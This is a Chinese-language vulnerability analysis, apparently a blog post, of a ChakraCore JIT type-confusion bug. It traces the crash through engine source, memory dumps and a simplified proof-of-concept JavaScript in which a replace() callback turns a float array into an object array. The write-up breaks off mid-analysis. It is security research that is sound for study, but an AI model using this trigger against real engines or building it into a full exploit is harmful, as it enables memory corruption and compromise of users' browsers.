
```
__inline ValueType ValueType::Merge(const Js::Var var) const

{

    using namespace Js;

    Assert(var);



    if(TaggedInt::Is(var))

        return Merge(GetTaggedInt());

    if(JavascriptNumber::Is_NoTaggedIntCheck(var))

    {

        return

            Merge(

                (IsUninitialized() || IsLikelyInt()) && JavascriptNumber::IsInt32_NoChecks(var)

                    ? GetInt(false)

                    : ValueType::Float);

    }

==>  return Merge(FromObject(RecyclableObject::FromVar(var)));

}



var    0x0000000000001234    void * const

```

首先这里`var`是`0x1234`就是不合法的，因为`0x1234`理应是个`TaggedInt`，但是它的49位却为0

`var`带着值`0x1234`执行函数`RecyclableObject::FromVar`导致异常。

可以看下如下对`TaggedInt`的验证

```
//VarTag_Shift=0x30

//TaggedInt的第49位必须是1

//(uintptr_t)aValue >> 32 == (AtomTag << 16)表示

//TaggedInt值使用的位必须小于49位

 __inline bool TaggedInt::Is(Var aValue)

    {

        bool result = (((uintptr_t) aValue) >> VarTag_Shift) == AtomTag;

        if(result)

        {

            Assert((uintptr_t)aValue >> 32 == (AtomTag << 16));

        }

        return result;

    }

```

```
    //>>50仍不等于0，说明51位以上一定有值

    //因为RecycleOject和int32的高14位一定为0，因此说明它不是这些

    //

    // Since RecyclableObject and Int32 in their Var representation have top 14 bits 0

    // and tagged float now has top 14 XOR'd with 1s - the value with 14 bits non zero is

    // a float.

    // A float can have all 14 bits 0 iff it was a NaN in the first place. Since

    // we can only produce NaNs with top 13 bits set (see k_Nan) - this cannot happen.

    inline bool JavascriptNumber::Is_NoTaggedIntCheck(Var aValue)

    {

        return ((uint64)aValue >> 50) != 0;

    }

```

向上追溯到`ProfiledLdElem`,箭头所指触发异常

```
  Var ProfilingHelpers::ProfiledLdElem(

        const Var base,

        const Var varIndex,

        FunctionBody *const functionBody,

        const ProfileId profileId)

    {

        Assert(base);

        Assert(varIndex);

        Assert(functionBody);

        Assert(profileId != Constants::NoProfileId);



        LdElemInfo ldElemInfo;



        // Only enable fast path if the javascript array is not cross site

#if ENABLE_COPYONACCESS_ARRAY

        JavascriptLibrary::CheckAndConvertCopyOnAccessNativeIntArray<Var>(base);

#endif

        const bool isJsArray = !TaggedNumber::Is(base) && VirtualTableInfo<JavascriptArray>::HasVirtualTable(base);

        const bool fastPath = isJsArray;

        if(fastPath)

        {

            JavascriptArray *const array = JavascriptArray::FromVar(base);

            ldElemInfo.arrayType = ValueType::FromArray(ObjectType::Array, array, TypeIds_Array).ToLikely();



            const Var element = ProfiledLdElem_FastPath(array, varIndex, functionBody->GetScriptContext(), &ldElemInfo);



    =====>  ldElemInfo.elemType = ldElemInfo.elemType.Merge(element);

            functionBody->GetDynamicProfileInfo()->RecordElementLoad(functionBody, profileId, ldElemInfo);

            return element;

        }

    ...

```

这里`element`是`0x1234`，由箭头上一句知`element`是`ProfiledLdElem_FastPath`返回值。查看`array`

```
//array源于传递过来的参数base

Var ProfilingHelpers::ProfiledLdElem(const Var base,

...

JavascriptArray *const array = JavascriptArray::FromVar(base);

...

const Var element = ProfiledLdElem_FastPath(array,



//查看array的内存

array 0x00000224949bc380 Js::JavascriptArray * const



0x00000224949BC380  00007ffc4d77e1d8 0000022494978fc0  ??wM?...????$...

0x00000224949BC390  0000000000000000 0000000000000005  ................

0x00000224949BC3A0  0000000000000002 00000224949bc3c0  ........????$...

0x00000224949BC3B0  00000224949bc3c0 0000000000000000  ????$...........

0x00000224949BC3C0  0000000200000000 0000000000000003  ................

0x00000224949BC3D0  0000000000000000 0000022494a255e0  ........?U??$...

0x00000224949BC3E0  0000000000001234 8000000280000002  4..........€...€

0x00000224949BC3F0  0000022494a803a0 00000224949d82c0  ?.??$...????$...

0x00000224949BC400  0000022494974240 0000000000000002  @B??$...........

0x00000224949BC410  0000000000000002 0000022494974270  ........pB??$...

0x00000224949BC420  0000022494974260 0000000000000000  `B??$...........

0x00000224949BC430  0000000000000000 0000000000000002  ................

0x00000224949BC440  0000000000000000 0000000000190101  ................

0x00000224949BC450  00000224949abe00 0000022494974250  .???$...PB??$...

```

地址`0x00000224949BC3E0`处正是`0x1234`

```
segmentBTreeRoot    0x00000224949bc3c0    Js::SegmentBTreeRoot *

{

    Js::SegmentBTree {}    Js::SegmentBTree

    lastUsedSegment    0x0000000000001234 {}    Js::SparseArraySegmentBase *

}

//可以看到这里把0x00000224949bc3c0解释成Js::SegmentBTreeRoot

//把0x1234解释成Js::SparseArraySegmentBase *

```

之后我们可以看到在`ProfilingHelpers::ProfiledLdElem_FastPath`中针对`array 0x224949bc380`进行的操作

```
//array是传入的参数

Var ProfilingHelpers::ProfiledLdElem_FastPath(

        JavascriptArray *const array,

//array->GetHead()的返回地址是0x00000224949BC3D8

SparseArraySegment<Var> *const head = static_cast<SparseArraySegment<Var> *>(array->GetHead());

//这里offset=1，取出的element值为0x1234

const uint32 offset = index;

    if(offset < head->length)

    {

        const Var element = head->elements[offset];

        if(!SparseArraySegment<Var>::IsMissingItem(&element))

        {

            // Successful fastpath

            return element;

        }

    }

```

至此我们明白了`0x00000224949BC3D8`是数组元素储存的地址

```
//共有两个元素

elements[0] 0x00000224949BC3D8

0x000022494a255e0 



elements[1] 0x00000224949BC3E0

0x000000000001234

```

针对`0x000022494a255E0`进行分析

```
//查看0x000022494a255E0 发现vtable

0x000022494a255E0  00007ffc3ef5af00 000001eef420a180  .??>?...€? ??...

0x000022494a255F0  0000000000000000 0000000000000000  ................

//查看0x0007ffc3ef5af00

0x00007FFC3EF5AF00  00007ffc3e7a15f0 00007ffc3e7a12f0  ?.z>?...?.z>?...

0x00007FFC3EF5AF10  00007ffc3e7a2fa0 00007ffc3e79e8a0  ?/z>?...??y>?...

0x00007FFC3EF5AF20  00007ffc3e7a7440 00007ffc3e7a73f0  @tz>?...?sz>?...

0x00007FFC3EF5AF30  00007ffc3e7a7490 00007ffc3e7a7390  ?tz>?...?sz>?...

0x00007FFC3EF5AF40  00007ffc3e7a7b00 00007ffc3e7a7a30  .{z>?...0zz>?...

0x00007FFC3EF5AF50  00007ffc3e79ec00 00007ffc3ddba150  .?y>?...P??=?...

...

//查看符号发现是DynamicObject

```

因此这个数组本应是储存`DynamicObject`的，并且也把`element[1]`作为`DynamicObject`解析了，因此我们可以明确这是一个类型混淆导致的`crash`。

## 分析POC

经简化后的POC如下

```
function main() {

    let arr = [1.1, 1.1];

    function opt(f) 

    {

        arr[0] = 1.1;

        arr[1] = 2.3023e-320 + parseInt('ab'.replace('a', f));//对应0x1234

        return 1;

    }



    for (var i = 0; i < 0x100; i++)

        opt('b');





    function exp(){

        arr[0] = {};

        return '0';

    }

    opt(exp);



    //trigger exception

    print(arr[1]);

}



main();

```

调试得知`arr[1] = 2.3023e-320 + parseInt('a'.replace('a', f));`对应的`hex`值即为`0x1234`。

在此我们猜测`for`循环`0x1000`次只是为了给`opt()`函数生成`JIT`代码，而当对`JIT`代码传递`exp`函数进行执行时就会触发漏洞。

为什么传递`exp`函数会触发`crash`？

```
function exp(){

    arr[0] = {};//给arr添加一个Object元素

    return '0';

}
```

猜测是`JIT`后的代码执行`exp`函数造成了`arr`由`float`类型混淆为`Object`类型数组。

梳理一下，多次调用后`opt()`被`JIT`，之后`Jstring.prototype.replace`调用用户定义`exp()`，而`exp()`暗含类型混淆的操作导致`crash`发生。

梳理清这点之后，可以提出几个问题：

- 1.为什么`opt()`要被`JIT`才会产生之后的结果？
- 2.为什么`string.prototype.replace`调用`exp()`会`crash`，`replace`函数存在什么问题？

为解决这些问题，需要定位`string.prototype.replace`函数，经调试发现函数会调用以下函数`N`次`for`
